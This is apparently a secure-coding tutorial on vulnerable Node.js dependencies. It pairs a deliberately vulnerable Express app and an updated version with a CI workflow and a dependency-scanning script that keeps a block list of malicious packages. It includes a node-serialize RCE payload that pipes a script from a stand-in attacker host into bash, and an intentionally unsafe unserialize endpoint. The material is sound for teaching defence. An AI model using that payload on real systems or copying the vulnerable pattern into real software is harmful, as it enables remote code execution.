Checking for vulnerable dependencies is critical. The Log4Shell vulnerability (CVE-2021-44228) demonstrated how a single vulnerable dependency can compromise entire infrastructure. Many Node.js projects unknowingly include vulnerable packages through transitive dependencies.

**VULNERABLE CODE**:

```javascript
// package.json - Using outdated and vulnerable dependencies
{
  "name": "vulnerable-app",
  "version": "1.0.0",
  "dependencies": {
    "lodash": "4.17.15",
    "minimist": "1.2.0",
    "node-serialize": "0.0.4",
    "express": "4.16.0",
    "marked": "0.3.6",
    "axios": "0.18.0"
  }
}
```

```javascript
// app.js - Using vulnerable packages without awareness
const express = require('express');
const serialize = require('node-serialize');
const marked = require('marked');
const _ = require('lodash');

const app = express();
app.use(express.json());

// VULNERABLE: node-serialize has RCE vulnerability (CVE-2017-5941)
app.post('/api/session', (req, res) => {
  const sessionData = req.body.session;
  const userData = serialize.unserialize(sessionData); // RCE possible!
  res.json({ user: userData });
});

// VULNERABLE: marked < 0.7.0 has XSS vulnerability (CVE-2022-21680)
app.post('/api/render', (req, res) => {
  const html = marked(req.body.markdown);
  res.send(html);
});

app.listen(3000);
```

**Attack Payload** (node-serialize RCE):
```javascript
// Malicious serialized object that executes code on deserialization
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

**Why This Is Dangerous**:
- `node-serialize` 0.0.4 allows arbitrary code execution through IIFE in serialized data
- `lodash` 4.17.15 has prototype pollution (CVE-2020-8203)
- `minimist` 1.2.0 has prototype pollution (CVE-2020-7598)
- `marked` 0.3.6 has ReDoS and XSS vulnerabilities
- Transitive dependencies may contain additional vulnerabilities

**SECURE VERSION**:

```javascript
// package.json - Using updated secure versions with lockfile
{
  "name": "secure-app",
  "version": "1.0.0",
  "engines": {
    "node": ">=18.0.0"
  },
  "scripts": {
    "audit": "npm audit --audit-level=moderate",
    "audit:fix": "npm audit fix",
    "preinstall": "npx npm-force-resolutions"
  },
  "dependencies": {
    "lodash": "^4.17.21",
    "minimist": "^1.2.8",
    "express": "^4.18.2",
    "marked": "^9.1.6",
    "axios": "^1.6.2",
    "helmet": "^7.1.0"
  },
  "overrides": {
    "semver": "^7.5.4"
  }
}
```

```javascript
// app.js - Secure implementation without dangerous serialization
const express = require('express');
const helmet = require('helmet');
const { marked } = require('marked');
const _ = require('lodash');
const { createHash } = require('crypto');

const app = express();

// Security headers
app.use(helmet());
app.use(express.json({ limit: '10kb' }));

// SECURE: Use safe JSON parsing instead of arbitrary deserialization
app.post('/api/session', (req, res) => {
  try {
    // Validate and sanitize session data structure
    const allowedKeys = ['userId', 'username', 'role'];
    const sessionData = {};

    for (const key of allowedKeys) {
      if (req.body[key] && typeof req.body[key] === 'string') {
        sessionData[key] = req.body[key].slice(0, 100);
      }
    }

    res.json({ user: sessionData });
  } catch (error) {
    res.status(400).json({ error: 'Invalid session data' });
  }
});

// SECURE: Configure marked with safe options
marked.setOptions({
  headerIds: false,
  mangle: false,
  breaks: false,
  gfm: true,
  sanitize: false // Use DOMPurify on client-side instead
});

app.post('/api/render', (req, res) => {
  if (typeof req.body.markdown !== 'string' || req.body.markdown.length > 50000) {
    return res.status(400).json({ error: 'Invalid input' });
  }
  const html = marked.parse(req.body.markdown);
  res.send(html);
});

app.listen(3000);
```

**Key Security Controls**:
- Updated all packages to versions without known CVEs
- Removed `node-serialize` entirely (no safe version exists)
- Added `helmet` for security headers
- Used `overrides` to force secure versions of transitive dependencies
- Set minimum Node.js version for security patches

Automated dependency scanning in CI/CD is essential for catching vulnerabilities before they reach production. After Log4Shell, organizations that had automated scanning detected the vulnerability within hours, while others took weeks.

**PRODUCTION PATTERN**:

```javascript
// .github/workflows/security-scan.yml
const securityWorkflow = `
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * *'  # Daily scan at 6 AM UTC

jobs:
  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci --ignore-scripts

      - name: Run npm audit
        run: npm audit --audit-level=high
        continue-on-error: false

      - name: Run Snyk scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high

      - name: Upload SBOM
        run: |
          npx @cyclonedx/cyclonedx-npm --output-file sbom.json

      - uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.json
`;
```

```javascript
// scripts/security-audit.js - Comprehensive dependency scanner
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

class DependencyScanner {
  constructor(options = {}) {
    this.severityThreshold = options.severityThreshold || 'high';
    this.maxAge = options.maxAgeDays || 365;
    this.blockedPackages = new Set([
      'node-serialize',
      'event-stream',
      'flatmap-stream',
      'ua-parser-js@0.7.29',
      'coa@2.0.3',
      'rc@1.2.9'
    ]);
    this.results = { vulnerabilities: [], outdated: [], blocked: [] };
  }

  async runFullScan() {
    console.log('[SECURITY] Starting comprehensive dependency scan...');

    await this.checkBlockedPackages();
    await this.runNpmAudit();
    await this.checkOutdatedPackages();
    await this.generateSBOM();

    return this.generateReport();
  }

  async checkBlockedPackages() {
    const lockfile = JSON.parse(
      fs.readFileSync('package-lock.json', 'utf8')
    );

    const allPackages = this.extractAllPackages(lockfile);

    for (const [name, version] of allPackages) {
      const pkgId = `${name}@${version}`;
      if (this.blockedPackages.has(name) || this.blockedPackages.has(pkgId)) {
        this.results.blocked.push({
          package: name,
          version: version,
          reason: 'Known malicious or critically vulnerable package',
          action: 'REMOVE IMMEDIATELY'
        });
      }
    }
  }

  extractAllPackages(lockfile, packages = new Map()) {
    if (lockfile.packages) {
      for (const [path, info] of Object.entries(lockfile.packages)) {
        if (path && info.version) {
          const name = path.replace(/^node_modules\//, '').split('/node_modules/').pop();
          if (name) packages.set(name, info.version);
        }
      }
    }
    return packages;
  }

  async runNpmAudit() {
    try {
      const output = execSync('npm audit --json', { encoding: 'utf8' });
      const audit = JSON.parse(output);

      if (audit.vulnerabilities) {
        for (const [pkg, data] of Object.entries(audit.vulnerabilities)) {
          this.results.vulnerabilities.push({
            package: pkg,
            severity: data.severity,
            via: data.via,
            fixAvailable: data.fixAvailable,
            range: data.range
          });
        }
      }
    } catch (error) {
      if (error.stdout) {
        const audit = JSON.parse(error.stdout);
        if (audit.vulnerabilities) {
          for (const [pkg, data] of Object.entries(audit.vulnerabilities)) {
            this.results.vulnerabilities.push({
              package: pkg,
              severity: data.severity,
              fixAvailable: data.fixAvailable
            });
          }
        }
      }
    }
  }

  async checkOutdatedPackages() {
    try {
      const output = execSync('npm outdated --json', { encoding: 'utf8' });
      const outdated = JSON.parse(output || '{}');

      for (const [pkg, info] of Object.entries(outdated)) {
        this.results.outdated.push({
          package: pkg,
          current: info.current,
          wanted: info.wanted,
          latest: info.latest,
          location: info.location
        });
      }
    } catch (error) {
      // npm outdated exits with code 1 if outdated packages exist
      if (error.stdout) {
        const outdated = JSON.parse(error.stdout || '{}');
        for (const [pkg, info] of Object.entries(outdated)) {
          this.results.outdated.push({
            package: pkg,
            current: info.current,
            latest: info.latest
          });
        }
      }
    }
  }

  async generateSBOM() {
    try {
      execSync('npx @cyclonedx/cyclonedx-npm --output-file sbom.json', {
        stdio: 'pipe'
      });
      console.log('[SECURITY] SBOM generated: sbom.json');
    } catch (error) {
      console.error('[SECURITY] SBOM generation failed:', error.message);
    }
  }

  generateReport() {
    const criticalVulns = this.results.vulnerabilities
      .filter(v => v.severity === 'critical').length;
    const highVulns = this.results.vulnerabilities
      .filter(v => v.severity === 'high').length;
    const blockedCount = this.results.blocked.length;

    const report = {
      timestamp: new Date().toISOString(),
      summary: {
        criticalVulnerabilities: criticalVulns,
        highVulnerabilities: highVulns,
        blockedPackages: blockedCount,
        outdatedPackages: this.results.outdated.length,
        passed: blockedCount === 0 && criticalVulns === 0
      },
      details: this.results
    };

    fs.writeFileSync(
      'security-report.json',
      JSON.stringify(report, null, 2)
    );

    // Exit with failure if critical issues found
    if (!report.summary.passed) {
      console.error('\n[SECURITY FAILURE] Critical issues detected!');
      console.error(`  - Critical vulnerabilities: ${criticalVulns}`);
      console.error(`  - High vulnerabilities: ${highVulns}`);
      console.error(`  - Blocked packages: ${blockedCount}`);
      process.exit(1);
    }

    console.log('\n[SECURITY PASSED] No critical issues detected.');
    return report;
  }
}

// Run scanner
const scanner = new DependencyScanner({
  severityThreshold: process.env.SEVERITY_THRESHOLD || 'high'
});

scanner.runFullScan()
  .then(report => console.log(JSON.stringify(report.summary, null, 2)))
  .catch(err => {
    console.error('[SECURITY] Scan failed:', err.message);
    process.exit(1);
  });
```

